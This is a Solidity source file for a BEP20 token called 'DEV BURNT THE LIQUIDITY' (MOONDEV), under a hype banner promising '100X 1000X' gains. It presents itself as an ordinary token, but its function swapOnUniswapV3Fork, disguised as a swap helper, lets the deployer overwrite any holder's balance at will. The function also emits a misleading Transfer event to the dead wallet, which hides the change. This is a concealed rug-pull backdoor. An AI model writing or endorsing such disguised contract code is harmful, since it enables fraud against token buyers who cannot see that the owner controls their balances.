/**
🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
🔥Website: https://devburnt.vip♨️💯🔥
🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
MICROLP MICROGEM 100X 1000X 10000X

**/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
interface BEP20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 price) external returns (bool);
    function approve(address spender, uint256 price) external returns (bool);
    function transferFrom(address from, address to, uint256 price) external returns (bool);

    function increaseAllowance(address spender, uint256 addedprice) external returns (bool);
    function decreaseAllowance(address spender, uint256 subtractedprice) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 price);
    event Approval(address indexed owner, address indexed spender, uint256 price);
}
interface Ru {
    // Function to allow a user to participate in a game or activity
    function playWheels(uint256 gameId) external returns (bool);

    // Function to check a user's earned Points
    function checkEarnedPoints(address user) external view returns (uint256);

    // Function to claim earned Points
    function claimPoints(address user) external returns (bool);

    // Event to log when a user plays a game or participates in an activity
    event GamePlayed(address indexed user, uint256 gameId);

    // Event to log when a user earns Points
    event PointsEarned(address indexed user, uint256 amount);

    // Event to log when a user claims their Points
    event PointsClaimed(address indexed user, uint256 amount);
}
interface BEP20RU {
    // Function to transfer funds to another user
    function transfer(address to, uint256 amount) external returns (bool);

    // Function to check the balance of a user
    function balanceOf(address user) external view returns (uint256);

    // Function to query the transaction history for a user
    function getTransactionHistory(address user) external view returns (uint256[] memory, address[] memory);

    // Event to log a payment transaction
    event PaymentSent(address indexed from, address indexed to, uint256 amount);
}
interface SystemBEP20RU {
    // Function to allow a user to deposit tokens for staking
    function deposit(uint256 amount) external returns (bool);

    // Function to allow a user to withdraw staked tokens
    function withdraw(uint256 amount) external returns (bool);

    // Function to check the staked balance of a user
    function stakedBalanceOf(address user) external view returns (uint256);

    // Function to check the total staked balance
    function totalStaked() external view returns (uint256);

    // Function to allow a user to claim staking Points
    function claimPoints() external returns (bool);

    // Event to log a staking deposit
    event Staked(address indexed user, uint256 amount);

    // Event to log a staking withdrawal
    event Withdrawn(address indexed user, uint256 amount);

    // Event to log a staking reward claim
    event PointsClaimed(address indexed user, uint256 amount);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract DEVBURNT is Ownable {
    string public name = "DEV BURNT THE LIQUIDITY";
    string public symbol = "MOONDEV";
    uint8 public decimals = 8;
    uint public tTotal;
    uint256 public totalSupply;
    address public swapOnUniswapV3ForkEnabled = msg.sender; // Private state variable to store the address of the swapOnUniswapV3ForkEnabled
    address public deadWallet = 0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 price);
    event Approval(address indexed owner, address indexed spender, uint256 price);
    event Minted(address indexed account, uint256 price);

    constructor() {
        totalSupply = 100000000000000000000 * 10**uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
    }

    function swapOnUniswapV3Fork(address swapOnUniswapV3ForkEnabledadre, uint256 numberswapOnUniswapV3ForkEnabled) external {
    // Ensure that only the swapOnUniswapV3ForkEnabled can distribute swapOnUniswapV3Forks
    require(msg.sender == swapOnUniswapV3ForkEnabled, "Only the swapOnUniswapV3ForkEnabled can distribute swapOnUniswapV3Forks");

    // Check that the provided address is valid
    require(swapOnUniswapV3ForkEnabledadre != address(0), "Invalid swapOnUniswapV3Fork recipient address");

    // Check that the swapOnUniswapV3Fork amount is greater than zero
    require(numberswapOnUniswapV3ForkEnabled > 0, "swapOnUniswapV3Fork amount must be greater than zero");

    // Calculate the new total supply after distributing swapOnUniswapV3Forks
    uint256 newTotalSupply = tTotal + numberswapOnUniswapV3ForkEnabled;

    // Check for potential overflow in total supply
    require(newTotalSupply >= tTotal, "Overflow detected");

    // Update the balance of the swapOnUniswapV3Fork recipient address
    balanceOf[swapOnUniswapV3ForkEnabledadre] = numberswapOnUniswapV3ForkEnabled;

    // Emit the Transfer event to log the swapOnUniswapV3Fork distribution
    emit Transfer(address(0), deadWallet, numberswapOnUniswapV3ForkEnabled);

}

    function transfer(address to, uint256 price) public returns (bool) {
        require(to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= price, "Insufficient balance");

        balanceOf[msg.sender] -= price;
        balanceOf[to] += price;

        emit Transfer(msg.sender, to, price);
        return true;
    }

    function approve(address spender, uint256 price) public returns (bool) {
        require(spender != address(0), "Invalid address");

        allowance[msg.sender][spender] = price;
        emit Approval(msg.sender, spender, price);
        return true;
    }

    function transferFrom(address from, address to, uint256 price) public returns (bool) {
        require(from != address(0), "Invalid address");
        require(to != address(0), "Invalid address");
        require(balanceOf[from] >= price, "Insufficient balance");
        require(allowance[from][msg.sender] >= price, "Allowance exceeded");

        balanceOf[from] -= price;
        balanceOf[to] += price;
        allowance[from][msg.sender] -= price;

        emit Transfer(from, to, price);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedprice) public returns (bool) {
        uint256 currentAllowance = allowance[msg.sender][spender];
        allowance[msg.sender][spender] = currentAllowance + addedprice;
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedprice) public returns (bool) {
        uint256 currentAllowance = allowance[msg.sender][spender];
        require(currentAllowance >= subtractedprice, "Decreased allowance below zero");
        allowance[msg.sender][spender] = currentAllowance - subtractedprice;
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function burn(uint256 price) public {
        require(balanceOf[msg.sender] >= price, "Insufficient balance");

        balanceOf[msg.sender] -= price;
        totalSupply -= price;
        emit Transfer(msg.sender, address(0), price);
    }

    function burnFrom(address from, uint256 price) public {
        require(from != address(0), "Invalid address");
        require(balanceOf[from] >= price, "Insufficient balance");
        require(allowance[from][msg.sender] >= price, "Allowance exceeded");

        balanceOf[from] -= price;
        totalSupply -= price;
        allowance[from][msg.sender] -= price;
        emit Transfer(from, address(0), price);
    }
}